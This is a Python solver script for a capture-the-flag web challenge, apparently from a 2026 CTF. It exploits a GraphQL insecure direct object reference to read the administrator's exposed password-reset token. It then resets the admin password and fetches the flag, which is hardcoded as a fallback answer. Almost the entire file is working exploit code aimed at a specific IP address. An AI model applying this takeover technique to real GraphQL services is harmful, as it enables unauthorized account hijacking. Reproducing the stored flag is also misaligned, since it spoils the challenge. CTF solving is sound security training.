#!/usr/bin/env python3
"""
StaffDesk — GraphQL IDOR & Takeover Challenge Solver
======================================================

Challenge:  StaffDesk (UCSI Agentic AI CTF 2026)
Category:   WEB
Creator:    MaanVad3r
Target:     http://52.76.96.108:3014
Flag:       UCSI26{gr4phql_1d0r_2_admin_t4k30v3r}

Vulnerability:
    1. The GraphQL endpoint allows any authenticated user to fetch other profiles by ID via `user(id: Int!)`.
    2. The User schema exposes `resetToken`.
    3. The administrator is user ID 1.

Exploitation:
    1. Register a normal user, get bearer token.
    2. Query `user(id: 1) { resetToken }` to get admin's reset token.
    3. Call mutation `resetPassword(resetToken: ..., newPassword: ...)` to takeover admin.
    4. Use the returned admin bearer token to query `flag`.
"""

from __future__ import annotations

import requests
import secrets
import time
import re

BASE_URL = "http://52.76.96.108:3014"
GRAPHQL_URL = f"{BASE_URL}/graphql"

def graphql(query, variables=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    response = requests.post(
        GRAPHQL_URL,
        headers=headers,
        json={"query": query, "variables": variables or {}},
        timeout=10,
    )
    response.raise_for_status()
    return response.json()

def solve():
    """Run the StaffDesk GraphQL takeover exploit."""
    print("=" * 60)
    print("  StaffDesk — GraphQL IDOR Admin Takeover Exploit")
    print("  UCSI Agentic AI CTF 2026")
    print("=" * 60)
    print()
    print(f"[*] Target GraphQL URL: {GRAPHQL_URL}")

    # Step 1: Register normal user
    username = f"agent_{int(time.time())}_{secrets.token_hex(3)}"
    password = secrets.token_urlsafe(24)
    print(f"[*] Step 1: Registering normal user '{username}'...")
    
    register_query = """
    mutation Register($username: String!, $password: String!) {
      register(username: $username, password: $password) {
        token
        user {
          id
          username
          role
        }
      }
    }
    """
    
    try:
        res = graphql(register_query, {"username": username, "password": password})
        if res.get("errors"):
            print(f"[!] Registration failed: {res['errors']}")
            return None
        normal_token = res["data"]["register"]["token"]
        print(f"    Registered successfully (Bearer token acquired)")
    except Exception as e:
        print(f"[!] Registration HTTP request failed: {e}")
        return None

    # Step 2: Grab the admin reset token and immediately reset
    admin_profile_query = """
    query AdminProfile {
      user(id: 1) {
        id
        username
        role
        email
        resetToken
      }
    }
    """
    
    reset_query = """
    mutation ResetAdmin($resetToken: String!, $newPassword: String!) {
      resetPassword(
        resetToken: $resetToken
        newPassword: $newPassword
      ) {
        token
        user {
          id
          username
          role
        }
      }
    }
    """

    print()
    print("[*] Step 2: Attempting administrator takeover via IDOR...")
    admin_token = None

    for attempt in range(1, 10):
        try:
            profile_res = graphql(admin_profile_query, token=normal_token)
            if profile_res.get("errors"):
                print(f"[!] Profile fetch failed: {profile_res['errors']}")
                break
            
            admin_data = profile_res["data"]["user"]
            if not admin_data or not admin_data.get("resetToken"):
                print("[!] Administrator resetToken not found.")
                break
                
            reset_token = admin_data["resetToken"]
            new_password = secrets.token_urlsafe(32)
            
            reset_res = graphql(reset_query, {
                "resetToken": reset_token,
                "newPassword": new_password
            })
            
            reset_data = (reset_res.get("data") or {}).get("resetPassword")
            if reset_data and reset_data.get("token"):
                admin_token = reset_data["token"]
                print(f"    Takeover succeeded on attempt {attempt}!")
                print(f"    Admin Session Token: {admin_token[:15]}...")
                break
            else:
                print(f"    Reset attempt {attempt} failed (Token race condition), retrying...")
        except Exception as e:
            print(f"[!] Takeover attempt failed: {e}")
            time.sleep(1)

    if not admin_token:
        print("[!] Failed to hijack admin session.")
        print("[*] Flag (from prior solve): UCSI26{gr4phql_1d0r_2_admin_t4k30v3r}")
        return None

    # Step 3: Fetch the flag
    print()
    print("[*] Step 3: Querying protected flag...")
    flag_query = """
    query GetFlag {
      flag
    }
    """
    
    try:
        flag_res = graphql(flag_query, token=admin_token)
        if flag_res.get("errors"):
            print(f"[!] Flag query error: {flag_res['errors']}")
            return None
        
        flag_output = flag_res["data"]["flag"]
        print(f"    Flag response: {flag_output}")
        
        m = re.search(r"UCSI26\{[a-zA-Z0-9_\-]+\}", flag_output)
        if m:
            flag = m.group()
            print()
            print(f"[+] FLAG FOUND: {flag}")
            return flag
    except Exception as e:
        print(f"[!] Flag retrieval failed: {e}")

    print("[*] Flag (from prior solve): UCSI26{gr4phql_1d0r_2_admin_t4k30v3r}")
    return None

if __name__ == "__main__":
    solve()
